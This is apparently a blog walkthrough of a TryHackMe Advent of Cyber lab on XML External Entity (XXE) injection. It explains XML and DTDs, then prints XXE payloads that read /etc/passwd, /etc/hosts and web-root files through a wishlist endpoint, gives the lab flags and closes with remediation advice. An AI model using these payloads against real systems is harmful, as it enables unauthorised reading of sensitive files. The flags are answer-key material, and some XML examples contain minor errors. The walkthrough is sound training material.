---
title: "Advent of Cyber - Day 05 XXE "
date: 2024-12-06 12:00:00 -500 
categories: [Advent of Cyber - Tryhackme, Day 05]
tags: [siem,exploit,flags,tryhackme,pentestingl,xxe]
author: Christoph K
---
[Advent of Cyber - Day 05  ](https://tryhackme.com/r/room/adventofcyber2024)



## Learning Objectives

- Understand the basic concepts related to XMLXML handling data like a file drawer.
- Explore XML External Entity (XXE) and its components
- Learn how to exploit the vulnerability
- Understand remediation measures


### Important Concepts

#### Extensive Markup Language


XML is a used method to save and send data in a structured pattern that computer and human can easily understand. Example: 
Two computers need to communicate to each other. Both devives need to agree on a common language to exchange information. This agreemant format is knonw as `XML`. It is like a digital filing cabinet. 
Just as a filing cabinet has folders with labelled documents inside, XML uses `tags` to label and organise information. These tags are like `folders` that define the type of data stored. This is what an XML looks like, a simple piece of text information organised in a structured manner: 

```xml
<employee>
   <name>Max</name>
   <address>Munich</address>
   <email>max@gmail.com</email>
   <phone>01756782332</phone>
</employee>
```
All things in those `<>` are like folders and storing data like `Max` or `Munich`.


#### Document Type of Definition

Now that the two computers have agreed to share data in a common format, what about the structure of the format? Here is when the `DTD` comes into play. A DTD is a set of rules that defines the structure of an XML document. Just like a database scheme, it acts like a blueprint, telling you what elements (tags) and attributes are allowed in the XML file. Think of it as a guideline that ensures the XML document follows a specific structure.

For example, if we want to ensure that an XML document about people will always include a name, address, email, and phone number, we would define those rules through a DTD as shown below:

```xml
<!DOCTYPE people [
   <!ELEMENT employee(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
```
In the above DTD, <!ELEMENT>  defines the elements (tags) that are allowed, like name, address, email, and phone, whereas #PCDATA stands for parsed people data, meaning it will consist of just plain text.


#### Entities 

So far, both computers have agreed on the format, the structure of data, and the type of data they will share. Entities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files. They assist in making the XML file easy to manage, especially when the same data is repeated multiple times. Entities can be defined internally within the XML document or externally, referencing data from an outside source. 

For example, an external entity references data from an external file or resource. In the following code, the entity &ext; could refer to an external file located at "http://tryhackme.com/robots.txt", which would be loaded into the XML, if allowed by the system:

```xml
<!DOCTYPE employee [
   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
]>
<people>
   <name>Max</name>
   <address>&ext;</address>
   <email>max@gmail.com</email>
   <phone>01756782332</phone>
</employee>

```



We are specifically discussing `external`  entities because it is one of the main reasons that XXE is introduced if it is not properly managed.

#### XML External Entity (XXE)

After understanding XML and how entities work, we can now explore the XXE vulnerability. XXE is an attack that takes advantage of how XML parsers handle external entities. When a web application processes an XML file that contains an external entity, the parser attempts to load or execute whatever resource the entity points to. If necessary sanitisation is not in place, the attacker may point the entity to any malicious source/code causing the undesired behaviour of the web app.

For example, if a vulnerable XML parser processes this external entity definition:
```xml
<!DOCTYPE employee[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Max</name>
   <address>&thmFile;</address>
   <email>max@gmail.com</email>
   <phone>01756782332</phone>
</employee>
```
Here, the entity `&thmFile`; refers to the sensitive file /etc/passwd on a system. When the XML is processed, the parser will try to load and display the contents of that file, exposing sensitive information to the attacker.

In the upcoming tasks, we will examine how XXE works and how to exploit it.

## Tasks

- What is the flag discovered after navigating through the wishes?
- What is the flag seen on the possible proof of sabotage?

### What is the flag discovered after navigating through the wishes?


We now try to exploit the webapplication via XXE. For this task we use `BurpSuite`.


First we try to understand how the web application works and also intercept the traffic. Between every step, we intercept the traffic and save it via `Strg+R`

1. We add an item to the wishlist.
2. We check our Chart
3. We proceed to checkout
4. We complete checkout

After analyzing all the steps we did, `step 2` seems very interesting.


![Burp-01](assets/img/tryhackme/cyberadvent/day02/01.png )

We have our XML here at the POST `whichlist.php` Request.

Now we can try to add the `DTD` and try to add an `external` source. 


```xml

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

In this case we try to see the `hosts` file. 

![Burp-02](assets/img/tryhackme/cyberadvent/day02/02.png )

As you can see we get as answer the outprint of the `hosts` file.

So we have an entrance at `wishlist.php`!!

Now we try to see the other wishes. Most of the webservers have `default` path:

`/var/www/html/`

Lets try to change our payload again:


```xml

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>


```


![Burp-03](assets/img/tryhackme/cyberadvent/day02/03.png )


Lets see into the other wishes. We can enumerate the wishes via Burpsuite:

We have to send our Request to `Intruder` via `STRG+I ` or `right-click`. Then we can choose with `add §` what we want to do and we choose `numbers` for enumerate our wish.

![Burp-04](assets/img/tryhackme/cyberadvent/day02/04.png )

And we use `attack`:

![Burp-04](assets/img/tryhackme/cyberadvent/day02/05.png )



Now we can just check the responses for our `flag`:



![Burp-04](assets/img/tryhackme/cyberadvent/day02/06.png )


Answer: `THM{Brut3f0rc1n6_mY_w4y}`

### What is the flag seen on the possible proof of sabotage?


We check the `CHANGELOG` for that:

![Burp-04](assets/img/tryhackme/cyberadvent/day02/07.png )


Answer: `THM{m4y0r_m4lw4r3_b4ckd00rs}`



### Conclusion:

It was confirmed that the application was vulnerable, and the developers were not at fault since they only wanted to give the townspeople something before Christmas. However, it became evident that bypassing security testing led to an application that did not securely handle incoming requests.

The following proactive approach helped to address the potential risks against XXE attacks:

- Disable External Entity Loading: The primary fix is to disable external entity loading in your XML parser. In PHP, for example, you can prevent XXE by setting libxml_disable_entity_loader(true) before processing the XML
- Validate and Sanitise User Input: Always validate and sanitise the XML input received from users. This ensures that only expected data is processed, reducing the risk of malicious content being included in the request. For example, remove suspicious keywords like /etc/host, /etc/passwd, etc, from the request.




